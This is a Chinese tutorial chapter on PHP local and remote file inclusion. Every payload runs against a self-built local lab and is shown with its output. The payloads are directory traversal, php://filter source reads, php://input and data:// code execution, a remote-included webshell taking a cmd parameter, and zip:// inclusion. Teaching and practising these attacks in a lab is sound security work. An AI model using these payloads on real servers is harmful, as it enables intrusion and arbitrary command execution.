# W06 文件包含
## File Inclusion (LFI/RFI)

> [!info]- 章节信息
> **所属方向**：Web 安全 ｜ **难度阶段**：L2 核心漏洞期 ｜ **前置要求**：[[11-Web安全版图与Burp|11 章]] · [[W03-信息泄露与前端安全|W03]] · [[W05-命令注入与代码执行|W05]]
> **本章目标**：分清 include 与 require 的失败行为，理解"非 PHP 标签原样输出"这条执行机制；查清 allow_url_fopen 与 allow_url_include 两个开关各管什么；在自建靶上打穿目录遍历与尾缀拼接，把 PHP 伪协议逐条过一遍；掌握日志注入、session 文件（含上传进度竞态）两条包含到 RCE 的路线；最后落到白名单与路径校验的防御写法。

[[11-Web安全版图与Burp#3.4 文件包含 LFI：路径你说了算|11 章 3.4]]用 `include($_GET['page'].'.php')` 演示过这类漏洞的最小形态和 `php://filter` 读源码的一句话用法。那一节回答的是"这类漏洞存在"；本章从 include 的语义开始，把机制、利用、绕过、到 RCE 的完整路线和防御系统过一遍。与 [[W05-命令注入与代码执行|W05]] 的分工：那一章讲"输入拼进执行函数"（`system`、`eval`），本章讲"输入拼进包含函数"——两者都把用户输入送到了危险函数的参数里，但解释权一个在 shell、一个在 PHP 的文件加载器，打法完全不同。

和 [[W04-SQL注入|W04]]、[[W05-命令注入与代码执行|W05]] 的方法相同：自建靶、curl 手工打、每条 payload 配输出。端口用 8600 段。

> [!note] 本章的实验约定
> 靶机全部用 [[W02-工具链实战与靶场搭建|W02]] 的 `php -S` 起服务，行为以 PHP 8.x 为准，涉及旧版本行为处单独写清版本背景。curl 一律带 `--noproxy '*'`（防止系统代理往响应里塞内容，[[11-Web安全版图与Burp#6. 常见问题|11 章常见问题表]]讲过这个坑），URL 一律用引号包住。需要向查询串里放 `<?php`、空格这类特殊字符时，用 curl 的 `-G --data-urlencode '参数名=值'`：`-G` 把 `--data` 的内容百分号编码后接在 URL 查询串里，免去手写编码。

## 1. include 语义与两个开关

### 1.1 四个包含语句

PHP 有四个包含语句，行为差异集中在两件事上：==文件不存在时脚本死不死、同一文件重复包含去不去重==。

| 语句 | 文件不存在时 | 重复包含 | 典型用途 |
| ---- | ---- | ---- | ---- |
| `include` | Warning，继续执行 | 允许 | 页面部件、可缺席的内容 |
| `include_once` | Warning，继续执行 | 第二次起跳过 | 函数、类定义文件 |
| `require` | Fatal，脚本中断 | 允许 | 配置、依赖库——缺了就不该继续跑 |
| `require_once` | Fatal，脚本中断 | 第二次起跳过 | 同上，外加去重 |

CLI 直接对照失败行为（GNU/Linux + bash）：

```bash
php -r 'include "no_such.php"; echo "after include\n";'
```

输出：

```
PHP Warning:  include(no_such.php): Failed to open stream: No such file or directory in Command line code on line 1
PHP Warning:  include(): Failed opening 'no_such.php' for inclusion (include_path='.:/usr/share/php') in Command line code on line 1
after include
```

```bash
php -r 'require "no_such.php"; echo "after require\n";'
```

输出：

```
PHP Warning:  require(no_such.php): Failed to open stream: No such file or directory in Command line code on line 1
PHP Fatal error:  Uncaught Error: Failed opening required 'no_such.php' (include_path='.:/usr/share/php') in Command line code:1
Stack trace:
#0 {main}
  thrown in Command line code on line 1
```

`include` 失败抛两条 Warning 后，`after include` 照常打印；`require` 失败升级成 Fatal，后面的代码不再执行。对攻击者的含义：打 `include` 靶时路径写错只会看到告警，靶还活着，可以反复试；两条 Warning 还顺手把"想打开的完整路径"回显了出来——本章多处利用这一点确认 payload 的最终形态。

`include_once` 的去重语义：

```bash
printf 'A<?php $v = "PHP"; ?>B<?= $v ?>' > mix.php
php -r 'include_once "mix.php"; include_once "mix.php"; echo "|done\n";'
```

输出：

```
ABPHP|done
```

第一次 `include_once` 执行了 mix.php（输出 `ABPHP`），第二次因为"已包含过"被跳过，`|done` 直接接上。

### 1.2 "<?php 之外原样输出"：包含为什么等于执行

PHP 文件的解析规则只有一条：`<?php` 与 `?>` 之间是代码，其余字节原样输出。上面那个 mix.php 的内容与运行结果：

```bash
cat mix.php
php mix.php
```

输出：

```
A<?php $v = "PHP"; ?>B<?= $v ?>
```

```
ABPHP
```

`A`、`B` 是标签外的普通文本，原样进了输出；标签内给 `$v` 赋值、`<?= $v ?>` 短 echo 打出 `PHP`。include 把目标文件并入当前脚本，按的正是同一套规则——==目标文件不需要 .php 后缀，任何文件里只要出现 `<?php` 起始标签，标签内的内容就会被当代码执行==。

这条机制推出文件包含漏洞的全部形态：

- 文件内容可控（能往里写 PHP 代码）→ 包含它就是==任意代码执行==；
- 文件内容不可控 → include 退化为"把文件内容读出来"，没有标签就原样输出——这就是用 `../../../../etc/passwd` 读系统文件的原理，一条路径同时覆盖"读"与"执行"两种能力。

### 1.3 LFI 与 RFI

按被包含对象的来源分两类：

| | LFI（Local File Inclusion） | RFI（Remote File Inclusion） |
| ---- | ---- | ---- |
| 包含对象 | 服务器本地磁盘上的文件 | 远程 URL（`http://` 等） |
| payload 放哪 | 要先落成本地文件（日志、session、上传） | 放自己的 HTTP 服务上，URL 一指即达 |
| 依赖开关 | 本地文件不需要任何开关 | `allow_url_fopen` 且 `allow_url_include` 都得开 |
| 常见度 | CTF 文件包含题的主力 | 少见（默认配置直接挡死，见 1.4） |

==RFI 直截了当但门槛高，LFI 是主战场==——本章主体是 LFI，RFI 在 [[#4.6 http:// 与 RFI：两个开关缺一不可|4.6]] 把条件说清。

### 1.4 两个开关：allow_url_fopen 与 allow_url_include

PHP 有两个 ini 开关管"URL 当文件用"，分工是本章许多现象的总开关：

| 开关 | 默认 | 管什么 |
| ---- | ---- | ---- |
| `allow_url_fopen` | On | 一切"把 URL 当文件读"的操作：`file_get_contents('http://…')`、`fopen` 远程文件等 |
| `allow_url_include` | Off | include/require 里出现 URL 形式的路径：`http://`、`php://input`、`data://` 等（PHP 5.2 引入） |

默认值与覆盖方式：

```bash
php -i | grep -E "^allow_url"
php -d allow_url_include=1 -i | grep -E "^allow_url_include"
```

输出：

```
allow_url_fopen => On => On
allow_url_include => Off => Off
```

```
allow_url_include => On => On
```

默认组合是"读远程可以、包含远程不行"。`-d` 是 php 的启动参数，只对这一次进程生效（`php -S` 起靶时就用它临时开）。运行时 `ini_set` 改不动它：

```bash
php -r 'var_dump(ini_set("allow_url_include", "1"), ini_get("allow_url_include"));'
```

输出：

```
bool(false)
string(0) ""
```

`ini_set` 返回 `false`、值纹丝不动——它是 `PHP_INI_SYSTEM` 级别，只能在 php.ini 或启动参数里改。对打靶的含义：==见到"php://input 不生效""http:// wrapper is disabled"一类报错，先查靶的启动方式有没有 `-d allow_url_include=1`==；改 ini 的代码救不了它。

## 2. 自建靶

### 2.1 目录与代码

一个目录贯穿全章：

```
lab/
├── index.php        ← 主靶：?page= 路由，include 拼上 .php；附带写日志、收 user 进 session
├── inc.php          ← 无尾缀靶：include($_GET['file'])
├── dummy.php        ← 惰性端点：6.2 节上传进度演示用
├── pages/
│   ├── home.php     ← 正常页面
│   └── about.php    ← 正常页面
├── logs/            ← 主靶模拟的 access.log 落在这里（第 5 节用）
├── uploads/         ← 3.3 节演示"已知可写文件"时手工放置
└── rfi/
    └── shell.txt    ← 4.6 节"远程服务器"上的小马
```

主靶 index.php，一个文件串起全章的三条线（session 写入、日志写入现在可以略过，第 5、6 节各自取用）：

```php
<?php
// index.php —— W06 主靶：?page= 路由，include 时固定拼上 .php
session_start();
if (isset($_GET['user'])) {
    $_SESSION['username'] = $_GET['user'];   // 模拟"登录名直接写进 session"
}

// 模拟 web 服务器写访问日志：时间、来源 IP、请求行、User-Agent 原样落盘
file_put_contents(
    __DIR__ . '/logs/access.log',
    sprintf("[%s] %s \"%s\" \"%s\"\n",
        date('H:i:s'),
        $_SERVER['REMOTE_ADDR'],
        $_SERVER['REQUEST_URI'],
        $_SERVER['HTTP_USER_AGENT'] ?? '-'),
    FILE_APPEND
);

$page = $_GET['page'] ?? 'pages/home';
include($page . '.php');                     // 漏洞点：路径可控，尾缀固定
```

漏洞点在最后一行：`$page` 完全来自输入，还被固定拼上 `.php` 尾缀——这就是 11 章 3.4 的最小形态，3.2 节专门讲这个尾缀带来什么、挡住什么。

无尾缀靶 inc.php，一行：

```php
<?php
// inc.php —— 无尾缀版：include($_GET['file'])，不追加任何后缀
include($_GET['file'] ?? '');
```

惰性端点 dummy.php（什么都不做，6.2 节当上传目的地）：

```php
<?php
// dummy.php —— 惰性端点：不启动 session、不写日志，供上传进度演示
http_response_code(204);
```

两个正常页面：

```php
<?php echo "<h1>W06 home</h1>\n"; ?>
```

```php
<?php $ver = 'w06-lab'; ?>
<h1>about this lab</h1>
<p>build: <?= $ver ?></p>
```

### 2.2 启动与正常访问

建目录、放一个后续要读的标记文件，然后起靶：

```bash
mkdir -p logs uploads
echo 'flag{tr4v3rs4l_t0_root}' > /tmp/w06note
cd ~/labs/w06
php -S 127.0.0.1:8600 -d display_errors=1 -d allow_url_include=1
```

两个 `-d` 的用途：`display_errors=1` 让 include 失败的 Warning 直接进 HTTP 响应，学习期能看到每个 payload 的失败原因（第 8 节讲生产环境为什么要关它）；`allow_url_include=1` 把 1.4 节那个默认关的开关临时打开，4.3、4.4、4.6 节的协议才能全量演示——第 4 节同时会起一个不带这个 `-d` 的第二实例（8610 端口）对照默认配置的行为。

正常访问：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/'
curl -s --noproxy '*' 'http://127.0.0.1:8600/?page=pages/about'
```

输出：

```
<h1>W06 home</h1>
```

```
<h1>about this lab</h1>
<p>build: w06-lab</p>
```

主靶正常路由的页面在 `pages/` 子目录下，所以正常值是 `pages/home`、`pages/about`。about.php 里标签外的那两行 HTML 原样输出、标签内的赋值照常生效——1.2 节的机制在一个正常页面里就能看到。

## 3. 基础 LFI：目录遍历与尾缀拼接

### 3.1 无尾缀靶：../ 遍历

inc.php 不拼任何尾缀，直接用相对路径向上爬。Web 根在 `/home/hua/labs/w06`，向上四级到根：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/inc.php?file=../../../../tmp/w06note'
```

输出：

```
flag{tr4v3rs4l_t0_root}
```

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/inc.php?file=../../../../etc/passwd' | head -5
```

输出：

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

`../` 的层数按 Web 根在文件系统里的深度算，数错了就多打几个——文件系统先把路径里的 `../` 规范化掉再定位，`/home/hua/labs/w06/../../../../../../../../etc/passwd` 与四级版本完全等价，==层数多了无害，少了到不了根==。探测思路（先猜深度再定路径）在 [[W03-信息泄露与前端安全|W03]] 的目录遍历一节说过，那里靠 HTTP 静态服务，这里换成 include，"读"的能力相同，但 include 多出一条"内容可控即执行"的路（1.2 节）。

Windows 服务器上 `include` 两种分隔符都认，payload 写 `..\..\` 或 `../..` 均可。

### 3.2 尾缀拼接：拼上 .php 之后

主靶把输入固定拼上 `.php`。把 3.1 的同一条路径打给主靶：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/?page=../../../../tmp/w06note'
```

输出：

```
<br />
<b>Warning</b>:  include(../../../../tmp/w06note.php): Failed to open stream: No such file or directory in <b>/home/hua/labs/w06/index.php</b> on line <b>20</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '../../../../tmp/w06note.php' for inclusion (include_path='.:/usr/share/php') in <b>/home/hua/labs/w06/index.php</b> on line <b>20</b><br />
```

Warning 把实际打开的路径原样回显：找的是 `../../../../tmp/w06note.php`——多出来的 `.php` 使目标从 `w06note` 变成了 `w06note.php`，后者不存在。==尾缀拼接把输入从"文件名"变成"文件名前缀"==，凡是不以 `.php` 结尾的真实路径都被这层拼接打歪。

### 3.3 尾缀靶的绕法

尾缀挡住的只是"前缀+.php 落不到真实文件"。绕法围绕一个判断展开：==拼上 `.php` 之后，整串内容能不能命中一个真实存在、且内容可控的文件==。

**绕法一：php://filter 的 resource 正好补齐文件名。** 4.2 节会讲 `php://filter` 的完整语法，这里先看它最常用的姿势——resource 值写 `inc`，尾缀拼上去之后 resource 变成 `inc.php`，恰好命中靶子自己的文件：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/?page=php://filter/read=convert.base64-encode/resource=inc'
```

输出：

```
PD9waHAKLy8gaW5jLnBocCDigJTigJQg5peg5bC+57yA54mI77yaaW5jbHVkZSgkX0dFVFsnZmlsZSddKe+8jOS4jei/veWKoOS7u+S9leWQjue8gAppbmNsdWRlKCRfR0VUWydmaWxlJ10gPz8gJycpOwo=
```

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/?page=php://filter/read=convert.base64-encode/resource=inc' | base64 -d
```

输出：

```
<?php
// inc.php —— 无尾缀版：include($_GET['file'])，不追加任何后缀
include($_GET['file'] ?? '');
```

base64 是过滤器加的编码，解码即得 inc.php 源码。==尾缀靶上读源码靠 filter 的本质：`.php` 落在 resource 参数值里，帮它补全了文件名==。11 章 3.4 那句"读源码找第二层漏洞"，打的就是这类靶。

**绕法二：指向磁盘上真实以 .php 结尾的可控文件。** 先放两个上传产物，一个文件名带 `.php`，一个不带：

```bash
printf '<?php echo "[avatar.php executed] "; system("id"); ?>\n' > uploads/avatar.php
printf '<?php echo "[avatar2.jpg executed] "; system("whoami"); ?>\n' > uploads/avatar2.jpg
```

打主靶（尾缀版）与 inc.php（无尾缀版）各一轮：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/?page=uploads/avatar'
curl -s --noproxy '*' 'http://127.0.0.1:8600/inc.php?file=uploads/avatar2.jpg'
```

输出：

```
[avatar.php executed] uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

```
[avatar2.jpg executed] hua
```

`uploads/avatar` 拼上尾缀后是 `uploads/avatar.php`，命中；`avatar2.jpg` 是"假图片"（内容其实是 PHP），无尾缀版直接吃。反过来在尾缀靶上打 `uploads/avatar2`：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/?page=uploads/avatar2'
```

输出：

```
<br />
<b>Warning</b>:  include(uploads/avatar2.php): Failed to open stream: No such file or directory in <b>/home/hua/labs/w06/index.php</b> on line <b>20</b><br />
```

对照结论：==尾缀靶只吃"名字以 .php 结尾"的文件，无尾缀靶吃任何文件==。这条结论直接决定打法——尾缀靶要么用绕法一读源码，要么想办法定出一个 `.php` 文件名（zip 包内条目名可以精确补成 `.php`，见 [[#4.7 zip:// 与 phar://：包内条目也是文件|4.7]]），无尾缀靶则连日志、图片都能直接包含。

**绕法三：让追加的尾缀落进不影响语义的位置。** 五种常用 payload 在尾缀靶上的真实成败：

| payload | 拼上 .php 之后 | 结果 |
| ---- | ---- | ---- |
| `php://input` | `php://input.php`，非法流名 | 失败 |
| `data://…;base64,PD9…` | `.php` 落在 base64 串尾，解码失败 | 失败 |
| `data://text/plain,<?php … ?>` | `.php` 落在 `?>` 之后，是普通文本 | 成功 |
| `http://…/shell.txt` | 远程变成 `shell.txt.php`，404 | 失败 |
| `http://…/shell.txt?` | 远程收到 `shell.txt?.php`，`?.php` 是查询串 | 成功 |

逐条打一遍。`php://input` 与 base64 形态的 `data://` 都被尾缀破坏：

```bash
curl -s --noproxy '*' --data-binary '<?php system("id");?>' 'http://127.0.0.1:8600/?page=php://input' | head -2
curl -s --noproxy '*' -G 'http://127.0.0.1:8600/' --data-urlencode 'page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+' | head -2
```

输出：

```
<br />
<b>Warning</b>:  include(): Invalid php:// URL specified in <b>/home/hua/labs/w06/index.php</b> on line <b>20</b><br />
```

```
<br />
<b>Warning</b>:  include(data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+.php): Failed to open stream: rfc2397: unable to decode in <b>/home/hua/labs/w06/index.php</b> on line <b>20</b><br />
```

裸文本形态的 `data://` 把 payload 用 `?>` 收口，尾缀落在标签外只能被当文本输出：

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:8600/' --data-urlencode 'page=data://text/plain,<?php system("id");?>'
```

输出：

```
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
.php
```

第一行是 payload 的执行结果，第二行 `.php` 就是被拼进数据末尾的那串字符——被当普通文本打回了响应。

RFI 的 `?` 中和同理：尾缀变成远程请求的查询串，远程服务器按无查询串的资源返回文件内容：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/?page=http://127.0.0.1:8601/shell.txt' | head -2
curl -s --noproxy '*' 'http://127.0.0.1:8600/?page=http://127.0.0.1:8601/shell.txt%3F&cmd=id'
```

输出：

```
<br />
<b>Warning</b>:  include(http://127.0.0.1:8601/shell.txt.php): Failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found
```

```
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

不带 `?` 时远程 404（服务器上没有 `shell.txt.php`）；`%3F` 是 `?` 的编码，加上之后远程把 `?.php` 当查询串丢弃，返回 shell.txt 的内容，代码照常执行。`data://` 与 RFI 的开关条件在 [[#4.4 data://：内容自带在 URL 里|4.4]] 与 [[#4.6 http:// 与 RFI：两个开关缺一不可|4.6]] 展开，这里先记住尾缀对它们的取舍。

> [!info]- 截断与版本史：%00 与 Windows 长度截断
> 老题解里常见的两条"吃掉尾缀"的路子，都只在没有修复的历史版本上成立：
>
> - **`%00` 空字节截断（PHP < 5.3.4）**：C 层的字符串以 `\0` 结尾，旧版 PHP 把路径交给底层文件函数时，`%00` 解码出的空字节把路径从这里截断——`../../etc/passwd%00.php` 实际打开的是 `../../etc/passwd`，尾缀 `.php` 被丢掉。PHP 5.3.4 起路径处理改为二进制安全，带空字节的路径直接打开失败。在当代 PHP 上试 `%00` 只会得到一条"找不到文件"的告警。
> - **Windows 路径长度截断**：旧 Windows 的路径上限（MAX_PATH，260 字符）之上会被静默截断——payload 用大量 `./` 或 `.` 把路径垫到上限附近，让程序拼上的尾缀连同垫长段一起被挤出有效路径。行为随 Windows 版本与 SAPI 而异，同为历史机制。
>
> 两条都不需要当代环境复现：见到只用得上它们的题解，说明靶子运行在旧版本上，payload 照搬即可；打当代靶直接跳过这条思路。

## 4. PHP 伪协议全集

PHP 把"输入流"抽象成 wrapper，`php://`、`data://`、`zip://` 这类前缀就是协议名。include 的参数是字符串，字符串是协议 URL 就走对应的 wrapper——==文件包含的攻击面因此远不止磁盘路径==。本节逐条把每个协议打给 inc.php：8600 实例开着 `allow_url_include=1`，8610 实例是默认配置，对照着看每个协议吃哪个开关：

```bash
cd ~/labs/w06
php -S 127.0.0.1:8610 -d display_errors=1
```

### 4.1 总表与开关归属

| 协议 | 作用 | include 时依赖 |
| ---- | ---- | ---- |
| `php://filter` | 对资源套过滤器再读、写 | 本地资源无开关要求 |
| `php://input` | 把原始 POST 体当文件 | `allow_url_include=1` |
| `data://` | 内容自带在 URL 里 | `allow_url_include=1` |
| `file://` | 绝对路径读本地文件 | 无 |
| `http://` `https://` | 读、包含远程文件 | `allow_url_fopen=1` 且 `allow_url_include=1` |
| `zip://` | 读 zip 包内的条目 | 无（本地资源） |
| `phar://` | 读 phar 包内的条目 | 无（本地资源） |
| `expect://` | 执行命令并读其输出 | 需安装 expect 扩展，默认没有 |

`expect://` 形如 `expect://id`，语义是"执行这条命令、把输出当流读回来"，需要 pecl 安装 expect 扩展，默认环境不装、CTF 靶几乎见不到，知道存在即可。

### 4.2 php://filter：读源码与过滤器管道

语法：`php://filter/read=<过滤器链>/resource=<资源>`，`read=` 前缀可以省略。过滤器用 `|` 串成管道，数据从左到右依次流过。三个过滤器读同一份 inc.php：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/inc.php?file=php://filter/read=string.rot13/resource=inc.php'
```

输出：

```
<?cuc
// vap.cuc —— 无尾缀版：vapyhqr($_TRG['svyr'])，不追加任何后缀
vapyhqr($_TRG['svyr'] ?? '');
```

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/inc.php?file=php://filter/read=string.rot13%7Cconvert.base64-encode/resource=inc.php' | base64 -d
```

输出：

```
<?cuc
// vap.cuc —— 无尾缀版：vapyhqr($_TRG['svyr'])，不追加任何后缀
vapyhqr($_TRG['svyr'] ?? '');
```

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/inc.php?file=php://filter/convert.base64-encode/resource=/tmp/w06note'
```

输出：

```
ZmxhZ3t0cjR2M3JzNGxfdDBfcm9vdH0K
```

三条各自说明一件事：`string.rot13` 把源码字母轮转 13 位，`<?php` 变成 `<?cuc`——==绕"输出里有 `<?php` 就替换"类过滤时用它==；`%7C` 是 `|` 的编码，rot13 与 base64 串成管道后数据先轮转再编码，所以本地 `base64 -d` 解出来的是 rot13 文本——还原顺序与管道顺序相反；第三条省略 `read=` 直接写过滤器，resource 指向任意本地路径（这条是 `/tmp/w06note`），解码得 `flag{tr4v3rs4l_t0_root}`。`convert.base64-encode` 是读源码的标配（[[#3.3 尾缀靶的绕法|3.3]]），src 拿到手先解码再看。

`read=` 管"从流读"时的过滤，对应的还有 `write=`：写入时先过过滤器。一个最短的"filter 写文件"演示：

```php
<?php
// writefilter.php —— php://filter 的 write= 用法：写入时过过滤器，file_put_contents 落盘即解码
$data = base64_encode('<?php system("id");?>');
var_dump(file_put_contents(
    'php://filter/write=convert.base64-decode/resource=gen_shell.php',
    $data
));
echo file_get_contents('gen_shell.php');
```

```bash
php writefilter.php
php gen_shell.php
```

输出：

```
int(28)
<?php system("id");?>
```

```
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

写入的内容是 base64 编码串，经过 `write=convert.base64-decode` 落盘的就是解码后的 PHP 代码——第二个命令执行它，`id` 的输出直接回来了。这条在"有文件写入口 + 内容被强制编码"的靶上出现：写入时套一层解码过滤器，落盘即还原。

### 4.3 php://input：POST 体即代码

`php://input` 是当前请求的原始 POST 体。include 它，等于把 POST 体整个当 PHP 文件执行：

```bash
curl -s --noproxy '*' --data-binary '<?php system("id");?>' 'http://127.0.0.1:8600/inc.php?file=php://input'
```

输出：

```
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

`--data-binary` 原样发送请求体。这是==门槛最低的包含到 RCE==：payload 不落任何盘，就在这次请求的 body 里。但它吃 `allow_url_include`——名字里没有 url 的流，照样归这个开关管。默认配置的 8610 上：

```bash
curl -s --noproxy '*' --data-binary '<?php system("id");?>' 'http://127.0.0.1:8610/inc.php?file=php://input'
```

输出：

```
<br />
<b>Warning</b>:  include(php://input): Failed to open stream: operation failed in <b>/home/hua/labs/w06/inc.php</b> on line <b>3</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'php://input' for inclusion (include_path='.:/usr/share/php') in <b>/home/hua/labs/w06/inc.php</b> on line <b>3</b><br />
```

`operation failed` 是 `php://input` 被开关挡住的报错长相（对照 4.4 与 4.6 节，那两个的报错会点名 allow_url_include）。另外 [[#3.3 尾缀靶的绕法|3.3]] 已经见过：`php://input` 拼 `.php` 即失效，它只在无尾缀靶上可用。PHP 5.6 起 `php://input` 可以重复读取，更老的版本整个请求周期只能读一次。

### 4.4 data://：内容自带在 URL 里

`data://` 按 RFC 2397 把内容直接编码进"文件名"：`data://text/plain;base64,<编码>`。payload 全在 URL 里，不需要任何落点：

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:8600/inc.php' --data-urlencode 'file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+'
```

输出：

```
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

`PD9waHAgc3lzdGVtKCdpZCcpOz8+` 是 `<?php system('id');?>` 的 base64（`echo -n '<?php system("id");?>' | base64` 自己造）。`--data-urlencode` 负责把 `+`、`/` 这些编码字符安全送进查询串。默认配置的 8610 上：

```bash
curl -s --noproxy '*' -G 'http://127.0.0.1:8610/inc.php' --data-urlencode 'file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+' | head -3
```

输出：

```
<br />
<b>Warning</b>:  include(): data:// wrapper is disabled in the server configuration by allow_url_include=0 in <b>/home/hua/labs/w06/inc.php</b> on line <b>3</b><br />
<br />
```

报错直接点名 `allow_url_include=0`——==data:// 的包含同样吃 allow_url_include==，这条属于"容易记错"的知识点，报错原文就是依据。尾缀靶上用它要用裸文本形态（`data://text/plain,<?php … ?>`，[[#3.3 尾缀靶的绕法|3.3]] 的成败表）。

### 4.5 file://：绝对路径的正规写法

`file:///tmp/w06note` 三段斜杠：协议名后跟绝对路径。它读本地文件不依赖任何开关：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8610/inc.php?file=file:///tmp/w06note'
```

输出：

```
flag{tr4v3rs4l_t0_root}
```

效果与直接写路径相同，价值在形状：==输入必须带协议前缀、或 `../` 被过滤而绝对路径放行时==，`file://` 是把路径补完整的正规姿势。

### 4.6 http:// 与 RFI：两个开关缺一不可

RFI 的 payload 托管在自己的 HTTP 服务上。lab 的 `rfi/` 子目录里放一个小马 shell.txt：

```php
<?php system($_GET['cmd'] ?? 'id'); ?>
```

本机把它当"远程"服务器跑起来：

```bash
cd ~/labs/w06/rfi
php -S 127.0.0.1:8601
```

8600 实例（`allow_url_include=1`）包含它，`cmd` 跟在靶的查询串上：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/inc.php?file=http://127.0.0.1:8601/shell.txt&cmd=id'
curl -s --noproxy '*' 'http://127.0.0.1:8600/inc.php?file=http://127.0.0.1:8601/shell.txt&cmd=ls%20pages'
```

输出：

```
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

```
about.php
home.php
```

被包含的远程代码与主脚本共享同一个 `$_GET`，所以 `cmd` 直接传进了远程小马。默认配置的 8610 上：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8610/inc.php?file=http://127.0.0.1:8601/shell.txt&cmd=id' | head -3
```

输出：

```
<br />
<b>Warning</b>:  include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in <b>/home/hua/labs/w06/inc.php</b> on line <b>3</b><br />
<br />
```

RFI 的完整条件：`allow_url_fopen=1`（默认已开）**加上** `allow_url_include=1`（默认关）。==默认配置下 RFI 不可用，这也是真实环境里 RFI 远少于 LFI 的原因==。

> [!warning] include 语境里，filter 套 http:// 一样要过 allow_url_include
> 老题解流传一条"用 php://filter 套 http:// 绕过 allow_url_include 读远程"的写法，当代 PHP 在 include 语境下不再成立。默认配置的 8610 上打 `php://filter/convert.base64-encode/resource=http://…`：
>
> ```
> <br />
> <b>Warning</b>:  include(php://filter/convert.base64-encode/resource=http://127.0.0.1:8601/shell.txt): Failed to open stream: operation failed in <b>/home/hua/labs/w06/inc.php</b> on line <b>3</b><br />
> <br />
> <b>Warning</b>:  include(): Failed opening 'php://filter/convert.base64-encode/resource=http://127.0.0.1:8601/shell.txt' for inclusion (include_path='.:/usr/share/php') in <b>/home/hua/labs/w06/inc.php</b> on line <b>3</b><br />
> ```
>
> 同一实例开 `allow_url_include=1` 后同一 payload 成功，吐出 shell.txt 的 base64：
>
> ```
> PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSA/PyAnaWQnKTsgPz4K
> ```
>
> 开关的管辖按"语境"分：==include/require 语境里，filter 的 resource 若是 http:// 一类远程协议，同样要过 allow_url_include==；普通读取函数（`file_get_contents`）不受它管，在默认配置的命令行下读同一个流：
>
> ```bash
> php -r 'var_dump(file_get_contents("php://filter/convert.base64-encode/resource=http://127.0.0.1:8601/shell.txt"));'
> ```
>
> 输出：
>
> ```
> string(52) "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSA/PyAnaWQnKTsgPz4K"
> ```
>
> 读到"filter 绕开关"的老说法时，先分辨它说的是读取语境还是包含语境。

### 4.7 zip:// 与 phar://：包内条目也是文件

zip 协议的路径形态是 `zip://<压缩包绝对路径>#<包内条目名>`，`#` 在 URL 里要写成 `%23`。构造一个内含小马的包：

```bash
printf '<?php system("id"); ?>\n' > inner_shell.php
zip -q ziplab.zip inner_shell.php
rm inner_shell.php
unzip -l ziplab.zip
```

输出：

```
Archive:  ziplab.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       23  2026-10-23 20:01   inner_shell.php
---------                     -------
       23                     1 file
```

打两个实例（Web 根按上文部署在 `/home/hua/labs/w06`，路径按实际部署替换）：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/inc.php?file=zip:///home/hua/labs/w06/ziplab.zip%23inner_shell.php'
curl -s --noproxy '*' 'http://127.0.0.1:8610/inc.php?file=zip:///home/hua/labs/w06/ziplab.zip%23inner_shell.php'
```

输出：

```
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

```
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

==zip:// 是本地资源，不吃 allow_url_include==，默认配置照常包含。它的真正价值在尾缀靶上——包内条目名可以精确以 `.php` 结尾，尾缀拼上去正好补全条目名：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8600/?page=zip:///home/hua/labs/w06/ziplab.zip%23inner_shell'
```

输出：

```
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

